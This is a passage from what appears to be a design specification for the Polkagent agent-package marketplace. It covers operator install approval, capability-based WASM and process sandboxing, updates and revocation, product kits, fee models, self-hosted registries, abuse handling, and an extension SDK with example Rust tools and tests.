    Reason: Read governance state, referendum details, and voting records.

Data access:
  Reads: chain_state:governance, chain_state:identity
  Writes: none
  Stores: none
  Transmits: network:rpc_queries
  Classification: Public

Dependencies (3):
  polkadot-chain-profile v1.2.0 (Verified, no new capabilities)
  openGov-schema v2.1.0 (Verified, no capabilities)
  governance-test-fixtures v1.0.0 (dev only, not installed)

Trust signals:
  Installs: 1,247
  Rating: 4.6/5 (89 reviews)
  Compatibility: ✓ macOS ARM, ✓ Linux x86_64
  Vulnerabilities: None known
  Last audit: 2026-06-15 by ExampleSec Ltd (0 critical, 0 high)

Grant capabilities and install? [y/N/details]
```

The operator cannot be bypassed. Automated installation (e.g., in CI/CD) uses
a pre-approved manifest or policy file:

```toml
# Operator pre-approval policy
[auto_approve]
trust_tier_minimum = "verified"
max_capabilities = ["network", "chain_read", "filesystem:read"]
deny_capabilities = ["chain_write", "economic", "process_spawn"]
publishers_allowed = ["Example Team", "Polkagent Core"]
```

### 7.5 Sandbox activation

When a package is activated, it runs within a sandbox that enforces its granted
capabilities. See section 8 for sandbox architecture details.

---

## 8. Sandboxing

### 8.1 Sandbox architecture

Every package with executable content runs within a sandbox. The sandbox
enforces the intersection of:

- The package's declared capabilities.
- The operator's granted capabilities.
- The current run's resolved grant (`ResolvedGrant` from PRD-07).

```
┌─────────────────────────────────────────────┐
│                Polkagent Runtime             │
│                                             │
│  ┌────────────────────────────────────────┐  │
│  │           Sandbox Boundary             │  │
│  │                                        │  │
│  │  ┌──────────────┐  ┌───────────────┐   │  │
│  │  │   Package    │  │   Mediated    │   │  │
│  │  │   Code       │──│   Host API    │   │  │
│  │  └──────────────┘  └───────┬───────┘   │  │
│  │                            │           │  │
│  └────────────────────────────┼───────────┘  │
│                               │              │
│  ┌────────────────────────────▼───────────┐  │
│  │         Capability Enforcer            │  │
│  │  • Check declared capabilities         │  │
│  │  • Check operator grants               │  │
│  │  • Check ResolvedGrant                 │  │
│  │  • Enforce resource limits             │  │
│  │  • Log access attempts                 │  │
│  └────────────────────────────────────────┘  │
│                                             │
│  ┌──────────────┐ ┌───────────┐ ┌────────┐  │
│  │  Network     │ │ Filesystem│ │ Chain  │  │
│  │  (filtered)  │ │ (scoped)  │ │ (gated)│  │
│  └──────────────┘ └───────────┘ └────────┘  │
└─────────────────────────────────────────────┘
```

### 8.2 Sandbox tiers

Different package types and trust levels receive different isolation:

| Tier | Isolation mechanism | Applies to |
|---|---|---|
| **Tier 0: Context only** | No executable code. Content loaded into agent context. | Skills, context packs, configs. |
| **Tier 1: Process isolation** | Separate OS process with restricted capabilities. | Trusted tools, verified publishers. |
| **Tier 2: WASM sandbox** | WebAssembly module with fuel, memory, and host-call restrictions. | Community tools, unverified publishers. |
| **Tier 3: Container isolation** | Container or microVM with full resource isolation. | Untrusted code, high-risk tools. |

Sandbox tier selection:

```rust
pub fn select_sandbox_tier(
    package: &ResolvedPackage,
    operator_policy: &SandboxPolicy,
) -> SandboxTier {
    // Operator override always wins.
    if let Some(override_tier) = operator_policy.tier_override(&package.name) {
        return override_tier;
    }

    match package.package_type {
        // Non-executable packages: no sandbox needed.
        PackageType::Skill
        | PackageType::ContextPack
        | PackageType::ModelConfig
        | PackageType::HarnessConfig
        | PackageType::ComputeProvider
        | PackageType::Feed
        | PackageType::AgentService => SandboxTier::ContextOnly,

        // Tools: tier based on trust.
        PackageType::Tool => match package.trust_tier {
            TrustTier::Curated | TrustTier::Verified => SandboxTier::Process,
            TrustTier::Signed => SandboxTier::Wasm,
            TrustTier::Unsigned => SandboxTier::Container,
        },

        // Product kits: constituent packages are individually sandboxed.
        PackageType::ProductKit => SandboxTier::ContextOnly,
    }
}
```

### 8.3 Capability-based isolation

The sandbox enforces capabilities through a mediated host API. Package code
cannot directly access system resources; it must call host functions that
check capabilities:

```rust
/// Host API available to sandboxed packages.
#[async_trait]
pub trait SandboxHostApi {
    /// Make an HTTP request (checked against network capabilities).
    async fn http_request(
        &self,
        request: HttpRequest,
    ) -> Result<HttpResponse, SandboxError>;

    /// Read a file (checked against filesystem capabilities).
    async fn read_file(
        &self,
        path: &SandboxPath,
    ) -> Result<Vec<u8>, SandboxError>;

    /// Write a file (checked against filesystem capabilities).
    async fn write_file(
        &self,
        path: &SandboxPath,
        content: &[u8],
    ) -> Result<(), SandboxError>;

    /// Query chain state (checked against chain_read capabilities).
    async fn chain_query(
        &self,
        query: ChainQuery,
    ) -> Result<ChainQueryResult, SandboxError>;

    /// Invoke another tool (checked against tool_invoke capabilities).
    async fn invoke_tool(
        &self,
        call: ToolCall,
    ) -> Result<ToolResult, SandboxError>;

    /// Log a message (always allowed; filtered by classification).
    fn log(&self, level: LogLevel, message: &str);
}
```

Every host API call:
1. Checks the call against the package's granted capabilities.
2. Checks the call against the current `ResolvedGrant`.
3. Enforces resource limits (request size, response size, timeout).
4. Logs the access attempt (successful or denied) for audit.
5. Strips or redacts data above the package's classification clearance.

### 8.4 Resource limits

Every sandbox has configurable resource limits:

| Resource | Default limit | Configurable |
|---|---|---|
| CPU time per invocation | 30 seconds | Yes |
| Memory | 256 MB | Yes |
| Network requests per invocation | 100 | Yes |
| Network bandwidth per invocation | 10 MB | Yes |
| Filesystem read | 100 MB | Yes |
| Filesystem write | 10 MB | Yes |
| Concurrent operations | 10 | Yes |
| Total invocations per hour | 1000 | Yes |

Resource exhaustion results in a clean termination with a descriptive error,
not a crash or undefined behavior.

### 8.5 WASM sandbox for untrusted code

Tools from unverified publishers run in a WASM sandbox:

- **Fuel metering:** Each WASM instruction consumes fuel. Fuel is bounded per
  invocation.
- **Memory limits:** Linear memory is capped. No unbounded allocation.
- **Host calls:** Only the `SandboxHostApi` functions are available. No raw
  system calls.
- **Time limits:** Wall-clock timeout enforces termination.
- **No ambient authority:** The WASM module starts with no capabilities. Every
  resource access goes through the host API.
- **Deterministic execution:** Where possible, WASM execution is deterministic
  for reproducibility and debugging.

#### 8.5.1 Selected runtime: Wasmtime Component Model with WIT

The WASM sandbox is implemented using **Wasmtime** with the **Component Model
and WIT (WebAssembly Interface Type)** definitions. This is not a future option
— it is the decided implementation direction.

The `polkagent:tool@1.0.0` WIT world (see section 14.4) is the capability
contract between host and guest. Capabilities are gated at component load time
via WIT world composition. A composed package can only expose a subset of the
capabilities the host world grants; composition cannot escalate authority
beyond what the host world permits.

**Metering defaults — both are OFF and must be explicitly enabled:**

| Mechanism | Purpose | How to enable |
|---|---|---|
| **Fuel** | Instruction-level budget; terminates on exhaustion. | `Store::set_fuel(budget)` before each invocation. |
| **Epoch interruption** | Wall-clock deadline; requires host thread to tick epoch counter. | `Engine::epoch_interruption(true)` + background ticker. |
| **`ResourceLimiter`** | Caps linear memory and table growth. | Implement `ResourceLimiter` on the `Store` data. |

All three mechanisms must be opted into at initialization time. A Wasmtime
store with no fuel set, no epoch configured, and no `ResourceLimiter` attached
imposes no resource bounds. The sandbox initialization code must set all three
before any untrusted component is loaded.

#### 8.5.2 Why Extism is not used for untrusted plugins

Extism (v1.12.0 at time of writing) pins its Wasmtime dependency to
`>=27,<31`, while current Wasmtime is v47.0.1. This means Extism users receive
security patches to Wasmtime materially later than direct embedders. For
trusted internal tooling, Extism's developer-experience abstractions are
reasonable; for sandboxing untrusted third-party plugins, the lag in security
patch uptake is unacceptable. Polkagent embeds Wasmtime directly so that
engine security updates are applied as soon as they are released.

### 8.6 Network restrictions

Network access is filtered at the sandbox boundary:

```rust
pub struct NetworkCapability {
    /// Allowed hostnames (supports wildcards: "*.parity.io").
    pub allowed_hosts: Vec<HostPattern>,
    /// Allowed protocols.
    pub allowed_protocols: Vec<Protocol>,
    /// Allowed ports (empty = default ports only).
    pub allowed_ports: Vec<u16>,
    /// Maximum request size.
    pub max_request_size: ByteSize,
    /// Maximum response size.
    pub max_response_size: ByteSize,
    /// Request timeout.
    pub timeout: Duration,
}
```

DNS resolution is performed by the host, not the sandbox. The sandbox cannot
resolve arbitrary hostnames to bypass host-based filtering.

### 8.7 Filesystem boundaries

Filesystem access is scoped to specific paths:

```rust
pub struct FilesystemCapability {
    /// Allowed read paths (absolute, no symlink traversal).
    pub read_paths: Vec<AbsolutePath>,
    /// Allowed write paths (absolute, no symlink traversal).
    pub write_paths: Vec<AbsolutePath>,
    /// Maximum file size for reads.
    pub max_read_size: ByteSize,
    /// Maximum file size for writes.
    pub max_write_size: ByteSize,
    /// Maximum total write volume per invocation.
    pub max_total_write: ByteSize,
}
```

Path operations:
- Resolve symlinks before checking against allowed paths.
- Reject path traversal attempts (`../`).
- Reject access to paths outside the allowed set.
- Log all filesystem access for audit.

---

## 9. Updates and revocation

### 9.1 Update notification

The Polkagent runtime periodically checks configured registries for updates
to installed packages:

```
polkagent package check-updates

Updates available:
  governance-scout: 1.3.0 → 1.3.1 (patch: security fix)
  openGov-schema: 2.1.0 → 2.2.0 (minor: new referendum types)

Apply updates? [y/N/details]
```

Update checks:
- Respect the operator's auto-update policy (patch only, minor, none).
- Compare content digests to detect tampering.
- Show capability changes for minor/major updates.
- Never automatically apply major version updates.

### 9.2 Update application

Updates follow the same installation workflow as initial installation:

1. Resolve the new version and its dependencies.
2. Download and verify content.
3. Review capability changes (if any).
4. Apply in a staged manner: install new version alongside old.
5. Activate the new version.
6. Retain the old version for rollback (section 9.5).

For updates that change capabilities:

```
Update: governance-scout 1.3.0 → 2.0.0

Capability changes:
  [NEW] chain_write: polkadot — ConvictionVoting::vote
    Reason: New feature: cast governance votes on behalf of the user.
  [REMOVED] network: *.parity.io
    (No longer needed)

This update adds chain_write capabilities. Review and approve? [y/N/details]
```

### 9.3 Security advisory handling

Security advisories are published through registries:

```rust
pub struct SecurityAdvisory {
    /// Unique advisory identifier.
    pub id: AdvisoryId,
    /// Affected package and version range.
    pub affected: AffectedRange,
    /// Severity: critical, high, medium, low, informational.
    pub severity: AdvisorySeverity,
    /// Description of the vulnerability.
    pub description: String,
    /// Fixed version (if available).
    pub fixed_version: Option<Version>,
    /// Workaround (if available).
    pub workaround: Option<String>,
    /// Advisory publication timestamp.
    pub published: DateTime<Utc>,
    /// References (CVE, report URL, etc.).
    pub references: Vec<AdvisoryReference>,
}
```

Advisory handling:

| Severity | Default behavior |
|---|---|
| Critical | Immediate notification. Package deactivated until operator reviews. |
| High | Notification within 1 hour. Package continues with warning. |
| Medium | Notification on next check. Package continues. |
| Low | Included in periodic update report. |
| Informational | Included in package details. |

Operators configure advisory behavior:

```toml
[security.advisories]
critical_action = "deactivate_and_notify"
high_action = "notify"
medium_action = "log"
check_interval_hours = 6
```

### 9.4 Emergency revocation

In cases of confirmed malicious behavior, a registry can issue a revocation:

```rust
pub struct Revocation {
    /// Package name and version (or version range).
    pub target: PackageRef,
    /// Reason for revocation.
    pub reason: RevocationReason,
    /// Revocation authority (registry, publisher, or security team).
    pub authority: RevocationAuthority,
    /// Signature from the authority.
    pub signature: Signature,
    /// Timestamp.
    pub issued: DateTime<Utc>,
    /// Whether existing installations should be deactivated.
    pub force_deactivate: bool,
}
```

Revocation rules:

1. **Publisher revocation.** A publisher can revoke their own package versions.
   Existing installations receive a warning but are not force-deactivated
   unless the publisher explicitly requests it.
2. **Registry revocation.** A registry can revoke packages published to it.
   This affects discovery and new installations. Existing installations
   receive a warning.
3. **Operator override.** The operator has final authority. An operator can
   ignore a revocation for their deployment (with explicit acknowledgment)
   or force-deactivate packages regardless of registry status.
4. **Cross-registry propagation.** Revocations are shared through federation.
   A federated registry propagates revocations from its peers with the peer's
   authority attribution.
5. **No silent force-uninstall.** Even a force-deactivate revocation only
   deactivates the package. It does not delete package content from the local
   store, allowing forensic analysis.

### 9.5 Rollback support

Every update retains the previous version for rollback:

```bash
# Roll back to previous version
polkagent package rollback governance-scout

# Roll back to a specific version
polkagent package rollback governance-scout --to 1.2.0

# List available rollback versions
polkagent package history governance-scout
```

Rollback:
- Restores the previous version's content and lockfile.
- Restores the previous version's capability grants.
- Logs the rollback with the reason.
- Does not roll back data or state changes made by the package during its
  active period (those are owned by the runtime, not the package).

Retention policy:
- By default, the two most recent versions are retained for rollback.
- Operators can configure retention depth.
- Manually pinned versions are retained indefinitely until unpinned.

---

## 10. Product kits

### 10.1 What is a product kit

A product kit is a composed bundle of packages designed for a specific user
outcome. It is the primary mechanism by which the Polkagent marketplace
delivers complete, ready-to-use agent capabilities.

Examples of product kits:

| Kit | User outcome | Constituent packages |
|---|---|---|
| **Polkadot Governance Scout** | Research and explain OpenGov referenda. | Skills: governance analysis, referendum summary. Tools: chain reader, document formatter. Context: OpenGov schema, track reference. |
| **Runtime Upgrade Assistant** | Safely plan and review runtime upgrades. | Skills: migration analysis, compatibility check. Tools: metadata differ, storage migration tester. Context: Polkadot SDK reference. |
| **Polkadot Payment Safe** | Prepare and review DOT/asset transfers. | Skills: transfer preparation, risk assessment. Tools: balance checker, fee estimator, address validator. Policies: spend limits, recipient allowlist. |
| **Builder Starter Kit** | Set up a Polkadot SDK development environment. | Skills: project scaffolding, code review. Tools: Zombienet launcher, contract tester. Context: Polkadot SDK tutorials. Harness: Rust analyzer config. |

### 10.2 Kit composition

A product kit manifest extends the standard manifest with a `[kit]` section:

```toml
[package]
name = "polkadot-governance-scout-kit"
version = "1.0.0"
package_type = "product_kit"
description = "Complete governance research agent for Polkadot OpenGov."
license = "Apache-2.0"

[kit]
# Constituent packages with version constraints.
[kit.packages]
"governance-analysis-skill" = { version = "^1.3.0", role = "primary" }
"referendum-summary-skill" = { version = "^1.0.0", role = "primary" }
"chain-reader-tool" = { version = "^2.0.0", role = "required" }
"document-formatter-tool" = { version = "^1.0.0", role = "optional" }
"openGov-schema" = { version = "^2.0.0", role = "context" }
"polkadot-track-reference" = { version = "^1.0.0", role = "context" }

# Default configuration for the kit.
[kit.defaults]
target_networks = ["polkadot", "kusama"]
auto_activate = true
update_policy = "auto_patch"

# Kit-specific policy defaults.
[kit.policy]
chain_write = false           # Read-only by default.
max_rpc_requests_per_hour = 500
data_classification = "Public"

# UX customization.
[kit.ux]
display_name = "Governance Scout"
icon = "assets/governance-scout-icon.svg"
short_description = "Research OpenGov referenda with cited evidence."
setup_guide = "docs/setup.md"
category = "governance"

# Acceptance fixtures.
[kit.fixtures]
test_manifest = "fixtures/test-manifest.toml"
expected_outputs = "fixtures/expected/"
```

### 10.3 Kit roles

Each constituent package has a role:

| Role | Meaning | Installation behavior |
|---|---|---|
| `primary` | Core skill or capability of the kit. | Always installed. |
| `required` | Tool or dependency required for primary packages. | Always installed. |
| `optional` | Additional capability that enhances the kit. | User chooses during setup. |
| `context` | Reference material loaded into agent context. | Always installed; no executable. |
| `policy` | Default policy configuration. | Applied with operator review. |
| `fixture` | Test and validation fixtures. | Installed in development mode. |

### 10.4 Kit installation and configuration

Kit installation is a guided process:

```
Installing: Polkadot Governance Scout Kit v1.0.0

This kit provides governance research capabilities for Polkadot OpenGov.

Required packages (will be installed):
  ✓ governance-analysis-skill v1.3.2 (Verified)
  ✓ referendum-summary-skill v1.0.1 (Verified)
  ✓ chain-reader-tool v2.1.0 (Verified)
  ✓ openGov-schema v2.1.0 (Verified)
  ✓ polkadot-track-reference v1.0.0 (Signed)

Optional packages:
  [ ] document-formatter-tool v1.0.3 (Verified)
      Formats governance reports as PDF/Markdown.

Configuration:
  Target networks: polkadot, kusama [change]
  Chain write access: disabled (read-only) [change]
  Auto-update: patch versions only [change]

Combined capabilities (all packages):
  [REQUIRED] network: rpc.polkadot.io, *.parity.io (https, wss)
  [REQUIRED] chain_read: polkadot, kusama — Referenda, ConvictionVoting, Preimage, Scheduler
  No chain_write, filesystem, or economic capabilities.

Proceed with installation? [y/N/details]
```

### 10.5 Kit lifecycle

```
┌──────────┐     ┌──────────┐     ┌──────────┐     ┌──────────┐
│ Discover │────▶│ Install  │────▶│Configure │────▶│ Active   │
│          │     │ packages │     │          │     │          │
└──────────┘     └──────────┘     └──────────┘     └──────┬───┘
                                                          │
                                       ┌──────────────────┼──────────┐
                                       │                  │          │
                                  ┌────▼─────┐     ┌──────▼───┐  ┌──▼───────┐
                                  │  Update  │     │ Disable  │  │ Uninstall│
                                  │          │     │          │  │          │
                                  └──────────┘     └──────────┘  └──────────┘
```

Kit updates:
- When any constituent package has an update, the kit checks whether the
  update is compatible with the kit's version constraints.
- Compatible updates are applied per the kit's update policy.
- Incompatible updates are held and the operator is notified.
- Kit version updates may change constituent packages, add new ones, or
  remove old ones.

Kit uninstallation:
- Removes all constituent packages unless they are also used by another
  installed kit or standalone.
- Removes kit-specific configuration and policy.
- Retains user data and artifacts created while the kit was active.

### 10.6 Kit marketplace listing

Product kits are featured in marketplace discovery:

```rust
pub struct KitListing {
    /// Kit metadata from manifest.
    pub metadata: PackageMetadata,
    /// Constituent package summary.
    pub packages: Vec<KitPackageSummary>,
    /// Combined capability summary.
    pub combined_capabilities: CapabilitySet,
    /// Kit-specific UX assets.
    pub display: KitDisplayInfo,
    /// Pricing (if commercial).
    pub pricing: Option<KitPricing>,
    /// Aggregate trust signals from all constituents.
    pub trust_summary: KitTrustSummary,
    /// User reviews specific to the kit.
    pub reviews: ReviewSummary,
}

pub struct KitTrustSummary {
    /// Minimum trust tier across all required constituents.
    pub minimum_trust: TrustTier,
    /// Whether all constituents are verified.
    pub all_verified: bool,
    /// Aggregate vulnerability status.
    pub vulnerability_status: VulnerabilityStatus,
    /// Kit-level audit attestation (if any).
    pub kit_audit: Option<AuditAttestation>,
}
```

---

## 11. Fee and licensing model

### 11.1 Platform fee structure

The marketplace supports configurable fees at multiple levels:

| Fee type | Payer | Recipient | Default | Configurable |
|---|---|---|---|---|
| **Publication fee** | Publisher | Registry operator | Free | By registry. |
| **Platform fee** | Buyer | Platform/protocol | 0% (initial) | By platform operator. |
| **Registry fee** | Buyer | Registry operator | 0% (initial) | By registry. |
| **Creator fee** | Buyer | Package publisher | Set by publisher | Publisher sets price/model. |
| **Referral fee** | Creator fee share | Referrer | 0% | By publisher. |
| **Curator fee** | Creator fee share | Curator | 0% | By curator agreement. |

Fee rules:
- All fees are transparently disclosed before purchase.
- Fee calculations are deterministic and auditable.
- Self-hosted registries set their own fee structure (including zero fees).
- The platform cannot extract fees from self-hosted registry transactions.

### 11.2 Publisher pricing options

Publishers choose from supported pricing models:

| Model | Description | Settlement |
|---|---|---|
| **Free** | No charge. No revenue share. | None. |
| **One-time purchase** | Pay once for a version or version range. | At installation. |
| **Subscription** | Recurring payment for access and updates. | Periodic (configured). |
| **Usage-metered** | Pay per invocation, token, or resource unit. | Periodic reconciliation or per-invocation (see below). |
| **Freemium** | Base package free; premium features paid. | Per-feature unlock. |
| **Donation/tip** | Optional payment. | At user discretion. |

#### 11.2.1 Per-invocation settlement via x402 and stablecoins

Per-invocation pricing (the usage-metered model at sub-second granularity) is
intended to settle via **HTTP 402 / x402** micropayment flows using a
stablecoin (e.g. USDC on an asset hub or a compatible EVM chain). In this
model:

1. The tool host makes an HTTP 402-gated request to the package's upstream
   service endpoint.
2. The service responds with payment requirements (amount, asset, recipient).
3. The host constructs and submits a stablecoin transfer using the autonomous
   agent's `economic` capability grant (PRD-08).
4. The service returns a payment receipt and processes the request.

This mechanism is appropriate for high-frequency, low-value invocations where
subscription billing would be impractical. It is **deferred to Phase 5+**
because it requires mature autonomous payment infrastructure (PRD-08).
Publishers who want to offer per-invocation pricing before Phase 5 should use
periodic reconciliation instead.

### 11.3 Revenue sharing

When a commercial package generates revenue:

```
Purchase price: $10.00
├── Creator fee: $8.50 (85%)
│   ├── Publisher: $7.65 (90% of creator fee)
│   └── Referral: $0.85 (10% of creator fee, if applicable)
├── Platform fee: $1.00 (10%)
└── Registry fee: $0.50 (5%)
```

Revenue sharing is:
- Configured per-registry and per-publisher agreement.
- Transparent to buyers (fee breakdown shown before purchase).
- Settled through the payment system defined in PRD-08.
- Not applicable to self-hosted registries unless the operator configures it.

### 11.4 License compliance

The manifest declares the package license. The resolver can enforce
organizational license policies:

```toml
[policy.licenses]
allowed = ["Apache-2.0", "MIT", "BSD-2-Clause", "BSD-3-Clause"]
denied = ["GPL-3.0-only", "AGPL-3.0-only"]
unknown_action = "warn"   # Or "deny" for strict environments.
```

---

## 12. Self-hosted marketplace

### 12.1 Local registry setup

A self-hosted registry is a standard Polkagent component:

```bash
# Initialize a local registry
polkagent registry init --path /var/lib/polkagent/registry

# Start the registry server
polkagent registry serve \
  --listen 0.0.0.0:8443 \
  --storage /var/lib/polkagent/registry \
  --tls-cert /etc/polkagent/certs/registry.pem \
  --tls-key /etc/polkagent/certs/registry.key

# Configure clients to use it
polkagent config set registry.default https://registry.internal:8443
```

Minimum local registry requirements:
- SQLite storage (no external database required).
- Static file serving (no CDN required).
- Optional authentication (for private registries).
- API compatibility with the standard `RegistryApi` trait.

### 12.2 Offline bundle management

For air-gapped environments:

```bash
# On connected machine: create a bundle with all dependencies
polkagent package bundle create \
  --packages governance-scout-kit@1.0.0 runtime-upgrade-kit@2.0.0 \
  --include-dependencies \
  --output /media/usb/polkagent-bundles/org-kit-2026-07.pak

# On air-gapped machine: import the bundle
polkagent package bundle import \
  --input /media/usb/polkagent-bundles/org-kit-2026-07.pak \
  --verify-signatures \
  --target-registry /var/lib/polkagent/registry

# Verify bundle integrity
polkagent package bundle verify \
  --input /media/usb/polkagent-bundles/org-kit-2026-07.pak
```

### 12.3 Digest verification

All package content is content-addressed:

```rust
pub struct ContentDigest {
    /// Hash algorithm (SHA-256 by default).
    pub algorithm: DigestAlgorithm,
    /// Hex-encoded hash of the package content.
    pub hash: String,
    /// Hash of the manifest specifically.
    pub manifest_hash: String,
    /// Merkle tree root of individual file hashes.
    pub merkle_root: String,
}
```

Verification is mandatory:
- At download from a registry.
- At import from a bundle.
- At sideload from a path.
- At activation (periodic integrity check).

Verification failure:
- Blocks installation or activation.
- Logs a security event.
- Notifies the operator.
- Does not silently fall back to an unverified copy.

---

## 13. Security and abuse operations

### 13.1 Vulnerability reporting

The default public registry provides a vulnerability reporting channel:

1. **Reporter submits a report** with affected package, version range,
   description, severity estimate, and optional proof of concept.
2. **Triage within 24 hours.** A security team member acknowledges the report
   and assigns severity.
3. **Publisher notification.** The publisher is notified through their
   registered contact.
4. **Fix timeline.** Based on severity:
   - Critical: 24-hour disclosure deadline (with possible extension).
   - High: 7-day disclosure deadline.
   - Medium: 30-day disclosure deadline.
   - Low: 90-day disclosure deadline.
5. **Advisory publication.** Once fixed or after deadline, a security advisory
   is published (section 9.3).

### 13.2 Malware detection

The default public registry performs automated scanning:

| Check | When | Action on failure |
|---|---|---|
| **Manifest validation** | At publication | Reject submission. |
| **Known malware signatures** | At publication + periodic rescan | Remove and revoke. Notify publisher. |
| **Suspicious patterns** | At publication | Flag for manual review. |
| **Dependency analysis** | At publication + periodic | Warn if dependencies have known vulnerabilities. |
| **Resource analysis** | At publication | Flag packages with unusual resource requirements. |
| **Capability escalation** | At version update | Flag if new version requests significantly broader capabilities. |

Self-hosted registries may implement their own scanning or disable it.

### 13.3 Abuse response procedures

Abuse categories and response:

| Category | Detection | Response | Timeline |
|---|---|---|---|
| **Malware** | Automated scan, user report, or security advisory. | Immediate revocation. Publisher suspended pending review. | Immediate. |
| **Credential harvesting** | Automated scan for credential patterns, user report. | Package removed. Publisher suspended. | Within 4 hours. |
| **Policy violation** | User report, automated policy check. | Package flagged. Publisher notified. | Within 24 hours. |
| **Spam/low-quality** | Automated analysis, community flags. | Package hidden from default views. Publisher warned. | Within 48 hours. |
| **License violation** | User report, automated license analysis. | Package flagged. Publisher notified. Legal review if needed. | Within 7 days. |
| **Name squatting** | Community report, automated analysis. | Name reservation reviewed. | Within 14 days. |

Publisher suspension:
- Suspends ability to publish new packages.
- Does not remove existing packages unless they are individually malicious.
- Includes appeal process with defined timeline.
- Logged with evidence and rationale.

### 13.4 Incident communication

When a security incident affects marketplace packages:

1. **Internal assessment.** Determine scope, affected packages, and severity.
2. **Advisory publication.** Publish advisories for all affected packages.
3. **Operator notification.** Push notifications to operators with affected
   packages installed. Include severity, impact, and remediation steps.
4. **Status page update.** Public status page reflects ongoing incidents.
5. **Post-incident review.** Within 14 days, publish a post-incident review
   with root cause, timeline, actions taken, and preventive measures.

Communication channels:
- Security advisory through registry API.
- Email notification to registered operators.
- CLI notification on next `polkagent` command.
- Status page at a documented URL.

---

## 14. Extension SDK

### 14.1 How to build a new package

The Extension SDK provides tools and documentation for creating Polkagent
packages. This section defines the developer experience for package authors.

#### 14.1.1 Package scaffolding

```bash
# Create a new skill package
polkagent package new --type skill my-custom-skill

# Create a new tool package
polkagent package new --type tool my-custom-tool

# Create a new product kit
polkagent package new --type product_kit my-custom-kit
```

Scaffolding generates:

```
my-custom-tool/
├── polkagent.manifest.toml    # Package manifest (pre-populated template)
├── src/
│   └── lib.rs                 # Tool implementation (Rust)
│   # or
│   └── lib.wasm               # Tool implementation (WASM, if applicable)
├── schemas/
│   ├── input.json             # Input schema
│   └── output.json            # Output schema
├── tests/
│   ├── unit_tests.rs          # Unit tests
│   └── integration_tests.rs   # Integration tests with sandbox
├── fixtures/
│   └── test_data/             # Test fixtures
├── docs/
│   └── README.md              # Package documentation
└── .polkagent/
    └── dev.toml               # Development configuration
```

#### 14.1.2 Tool implementation

A tool implements the `PolkagentTool` trait:

```rust
use polkagent_sdk::prelude::*;

/// A custom tool that validates Polkadot addresses.
#[polkagent_tool]
pub struct AddressValidator;

#[async_trait]
impl PolkagentTool for AddressValidator {
    type Input = AddressValidatorInput;
    type Output = AddressValidatorOutput;

    fn metadata(&self) -> ToolMetadata {
        ToolMetadata {
            name: "address_validator".into(),
            description: "Validate and decode Polkadot SS58 addresses.".into(),
            version: Version::parse("1.0.0").unwrap(),
            capabilities: vec![
                // This tool needs no special capabilities.
            ],
        }
    }

    async fn invoke(
        &self,
        input: AddressValidatorInput,
        ctx: &ToolContext,
    ) -> Result<AddressValidatorOutput, ToolError> {
        // Implementation uses only the ToolContext (sandboxed host API).
        let decoded = decode_ss58(&input.address)?;

        Ok(AddressValidatorOutput {
            valid: true,
            network: decoded.network,
            public_key: decoded.public_key_hex,
            account_type: decoded.account_type,
        })
    }
}

#[derive(Deserialize, JsonSchema)]
pub struct AddressValidatorInput {
    /// The SS58-encoded address to validate.
    pub address: String,
}

#[derive(Serialize, JsonSchema)]
pub struct AddressValidatorOutput {
    pub valid: bool,
    pub network: String,
    pub public_key: String,
    pub account_type: String,
}
```

#### 14.1.3 Skill implementation

A skill is a declarative package of instructions and schemas:

```
my-governance-skill/
├── polkagent.manifest.toml
├── prompts/
│   ├── system.md              # System prompt for the skill
│   ├── analysis.md            # Analysis prompt template
│   └── summary.md             # Summary prompt template
├── schemas/
│   ├── referendum.json        # Schema for referendum data
│   └── analysis_output.json   # Schema for analysis output
├── examples/
│   ├── example_referendum.json
│   └── example_analysis.json
├── context/
│   └── openGov_reference.md   # Reference material included in context
└── tests/
    └── skill_tests.toml       # Test cases with expected behaviors
```

Skill test format:

```toml
[[test_cases]]
name = "referendum_analysis"
description = "Analyze a governance referendum."
input = "Explain referendum #1234 on Polkadot."
expected_tool_calls = ["chain_read"]
expected_output_contains = ["referendum", "track", "origin"]
expected_output_excludes = ["vote", "delegate"]  # Read-only skill.
max_tokens = 16000
```

### 14.2 Testing framework

The SDK provides a testing framework for packages:

#### 14.2.1 Unit testing

```rust
#[cfg(test)]
mod tests {
    use super::*;
    use polkagent_sdk::testing::*;

    #[tokio::test]
    async fn test_valid_polkadot_address() {
        let tool = AddressValidator;
        let ctx = MockToolContext::new()
            .with_capabilities(vec![]);  // No special capabilities.

        let result = tool.invoke(
            AddressValidatorInput {
                address: "15oF4uVJwmo4TdGW7VfQxNLavjCXviqWrztPu6QKx1s5HCQR".into(),
            },
            &ctx,
        ).await.unwrap();

        assert!(result.valid);
        assert_eq!(result.network, "polkadot");
    }

    #[tokio::test]
    async fn test_invalid_address() {
        let tool = AddressValidator;
        let ctx = MockToolContext::new();

        let result = tool.invoke(
            AddressValidatorInput {
                address: "invalid_address".into(),
            },
            &ctx,
        ).await;

        assert!(result.is_err());
    }
}
```

#### 14.2.2 Sandbox integration testing

```rust
#[cfg(test)]
mod sandbox_tests {
    use polkagent_sdk::testing::*;

    #[tokio::test]
    async fn test_capability_enforcement() {
        let sandbox = TestSandbox::new()
            .with_package("my-tool", "1.0.0")
            .with_capabilities(vec![
                Capability::Network {
                    hosts: vec!["rpc.polkadot.io".into()],
                    protocols: vec![Protocol::Wss],
                },
            ]);

        // Allowed: request to rpc.polkadot.io
        let result = sandbox.invoke_tool(
            "my-tool",
            json!({"endpoint": "rpc.polkadot.io"}),
        ).await;
        assert!(result.is_ok());

        // Denied: request to unauthorized host
        let result = sandbox.invoke_tool(
            "my-tool",
            json!({"endpoint": "evil.example.com"}),
        ).await;
        assert!(matches!(result, Err(SandboxError::CapabilityDenied(_))));
    }
}
```

#### 14.2.3 Conformance testing

Every package type has a conformance test suite that validates:

| Check | What it verifies |
|---|---|
| **Manifest validity** | Manifest parses, all required fields present, valid SemVer, valid capabilities. |
| **Capability honesty** | Package does not attempt to use undeclared capabilities. |
| **Resource compliance** | Package stays within declared resource limits. |
| **Schema compliance** | Inputs and outputs match declared schemas. |
| **Sandbox isolation** | Package cannot escape sandbox boundaries. |
| **Determinism** | Where applicable, same inputs produce same outputs. |
| **Error handling** | Package handles invalid inputs and resource failures gracefully. |

```bash
# Run conformance tests for a package
polkagent package test --conformance

# Run all tests (unit + integration + conformance)
polkagent package test --all
```

### 14.3 Publishing workflow

```bash
# Step 1: Build the package
polkagent package build

# Step 2: Run all tests
polkagent package test --all

# Step 3: Generate SLSA provenance attestation (requires OIDC token from CI)
polkagent package provenance generate --slsa-level 2

# Step 4: Sign the package with cosign v3 keyless (uses ambient OIDC identity)
polkagent package sign --keyless

